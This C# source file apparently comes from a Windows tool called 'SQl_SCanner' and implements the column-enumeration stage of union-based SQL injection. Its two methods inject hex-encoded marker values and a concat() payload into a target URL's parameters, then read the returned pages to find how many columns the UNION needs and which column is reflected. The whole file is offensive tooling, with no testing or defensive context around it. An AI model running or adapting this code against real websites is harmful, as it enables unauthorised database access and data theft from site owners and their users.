using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SQl_SCanner
{
    class sqli_colonne
    {
        private MainForm form = GlobalVar.form;
        private string syntax_count = "9136665615.9";
        private string var_n = "[t]";
        private chaine ch = new chaine();
        public int Compter(List<string> param, string url_base,string union)
        {
            checked
            {
                HttpRequete hr = new HttpRequete();
                for (int p = 0; p < param.Count; p++)
                {
                    for (int i = 0; i <= 60; i++)
                    {
                        string url_curr = url_base + 
                            ch.ViderDernierParam(ch.genParamParIndex(param, 0, (p + 1))) +
                            ch.Encode(union.Replace(var_n, GenSynHex(i))) + 
                            ch.genParamParIndex(param, p + 1, param.Count);
                        string page = hr.get(url_curr);
                        if (page.Contains(syntax_count))
                        {
                            return i;
                        }
                    }
                }
                return 0; 
            }
        }
        public int FindColonneVise(string url, int maxColonne)
        {
            HttpRequete hr = new HttpRequete();
            const string okstr = "QUADCOREENGINE666";//51554144434f5245454e47494e45363636
            string chkstr = "concat(0x217e21," + var_n + ",0x217e21)";//concat(0x217e21,0x51554144434f5245454e47494e45363636,0x217e21)
            string url_f = string.Empty;
            string _url_base = url.Split('?')[0];
            string _url_params = "?" + url.Split('?')[1];
            for (int i = 1; i <= maxColonne + 1; i++)
            {
                string param = ch.Encode(chkstr.Replace(var_n, ch.getHex(okstr)));
                var regex = new Regex(Regex.Escape(i.ToString()));
                url_f = _url_base + regex.Replace(_url_params, param, 1);
                string page = hr.get(url_f);
                if (page.Contains(okstr))
                {
                    return i;
                }
            }
            //MessageBox.Show(url_f);
            return -1;
        }
        private string GenSynHex(int index)
        {
            string concat = string.Empty;
            for (int i = 0; i <= index; i++)
			{
                if(i + 1 > index)
			        concat += ch.getHex(syntax_count);
                else
                    concat += ch.getHex(syntax_count) + ",";
			}
            return concat;
        }
    }
}
